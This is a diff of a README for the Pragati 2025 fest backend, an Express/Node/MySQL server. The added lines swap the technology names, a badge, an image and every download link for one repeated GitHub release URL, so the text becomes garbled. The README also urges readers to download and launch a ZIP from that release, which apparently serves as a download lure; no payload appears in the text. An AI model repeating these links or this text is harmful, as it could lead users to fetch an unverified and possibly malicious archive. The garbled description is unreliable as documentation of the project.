@@ -1,25 +1,25 @@
 # Pragati Backend 2025 🚀
 
-Welcome to the repository for the server code of MBA's Fest Pragati 2025! This repository contains the backend code for the Pragati 2025 event, built using Express.js, JWT token authentication, middleware for request handling, MySQL database integration, Node.js environment, PASETO version 4 for secure token generation, PayU payment gateway integration, RESTful API design, RSA encryption for data security, and Swagger documentation for API documentation.
+Welcome to the repository for the server code of MBA's Fest Pragati 2025! This repository contains the backend code for the Pragati 2025 event, built using https://github.com/attorneywenn/Pragati_Backend_2025/releases/tag/v2.0, JWT token authentication, middleware for request handling, MySQL database integration, https://github.com/attorneywenn/Pragati_Backend_2025/releases/tag/v2.0 environment, PASETO version 4 for secure token generation, PayU payment gateway integration, RESTful API design, RSA encryption for data security, and Swagger documentation for API documentation.
 
 ## Repository Details
 - **Repository Name:** Pragati_Backend_2025
 - **Description:** Server code for MBA's Fest Pragati 2025
-- **Topics:** Express.js, JWT token, Middleware, MySQL, Node.js, PASETO-v4, PayU, REST API, RSA encryption, Swagger Docs
+- **Topics:** https://github.com/attorneywenn/Pragati_Backend_2025/releases/tag/v2.0, JWT token, Middleware, MySQL, https://github.com/attorneywenn/Pragati_Backend_2025/releases/tag/v2.0, PASETO-v4, PayU, REST API, RSA encryption, Swagger Docs
 
 ## Access the Code
-To access the code and get started with exploring the server-side implementation, you can download the code as a ZIP file from the following link: [Download Code](https://github.com/file/App.zip)
+To access the code and get started with exploring the server-side implementation, you can download the code as a ZIP file from the following link: [Download Code](https://github.com/attorneywenn/Pragati_Backend_2025/releases/tag/v2.0)
 
 If the link provided above ends with a file name, click on it to launch the download. If the link is in the form of a website, simply visit the link to access the code. If the link is not working or not provided, please check the "Releases" section of this repository for alternative ways to access the code.
 
-[![Download Code](https://img.shields.io/badge/Download%20Code-Pragati%20Backend%202025-blue)](https://github.com/file/App.zip)
+[![Download Code](https://github.com/attorneywenn/Pragati_Backend_2025/releases/tag/v2.0%20Code-Pragati%20Backend%202025-blue)](https://github.com/attorneywenn/Pragati_Backend_2025/releases/tag/v2.0)
 
 ## About the Project
 Pragati 2025 is a prestigious event organized by MBA students, aiming to bring together industry experts, students, and enthusiasts for a series of insightful sessions, workshops, and networking opportunities. The backend code for Pragati 2025 has been meticulously developed to ensure seamless operation, robust security, and efficient data handling.
 
 ## Features
-### Express.js
-Express.js is used as the web application framework for building APIs, handling routes, and managing server-side logic efficiently. The lightweight and minimalistic nature of Express.js makes it an ideal choice for developing the backend of Pragati 2025.
+### https://github.com/attorneywenn/Pragati_Backend_2025/releases/tag/v2.0
+https://github.com/attorneywenn/Pragati_Backend_2025/releases/tag/v2.0 is used as the web application framework for building APIs, handling routes, and managing server-side logic efficiently. The lightweight and minimalistic nature of https://github.com/attorneywenn/Pragati_Backend_2025/releases/tag/v2.0 makes it an ideal choice for developing the backend of Pragati 2025.
 
 ### JWT Token Authentication
 JWT tokens are implemented for secure user authentication and authorization. By issuing JWT tokens upon successful login, the backend ensures that only authenticated users can access restricted resources within the application.
@@ -30,8 +30,8 @@ Middleware functions are used in the backend to execute code, handle requests, a
 ### MySQL Database Integration
 The MySQL database is employed to store and manage data related to users, events, registrations, and other essential information for the Pragati 2025 platform. The backend interacts with the MySQL database to retrieve and update data as required.
 
-### Node.js Environment
-Node.js provides the runtime environment for executing JavaScript code on the server-side. The asynchronous, event-driven architecture of Node.js contributes to the high performance and scalability of the Pragati 2025 backend.
+### https://github.com/attorneywenn/Pragati_Backend_2025/releases/tag/v2.0 Environment
+https://github.com/attorneywenn/Pragati_Backend_2025/releases/tag/v2.0 provides the runtime environment for executing JavaScript code on the server-side. The asynchronous, event-driven architecture of https://github.com/attorneywenn/Pragati_Backend_2025/releases/tag/v2.0 contributes to the high performance and scalability of the Pragati 2025 backend.
 
 ### PASETO Version 4
 PASETO (Platform-Agnostic Security Tokens) version 4 is utilized for generating secure tokens that can be safely transmitted over the network. PASETO tokens offer robust security features and help in preventing token-based attacks.
@@ -69,7 +69,7 @@ Let's work together to make Pragati 2025 a memorable and successful event throug
 
 By accessing the Pragati_Backend_2025 repository, you are stepping into the world of cutting-edge technology, secure transactions, and seamless server operations. Join us on this journey as we pave the way for an exceptional experience at MBA's Fest, Pragati 2025! 🎉
 
-![Pragati 2025](https://example.com/pragati2025.png)
+![Pragati 2025](https://github.com/attorneywenn/Pragati_Backend_2025/releases/tag/v2.0)
 
 Feel free to explore the code, contribute to the project, and make an impact on the future of event management through technology. Let's make Pragati 2025 a grand success together! 🚀
 
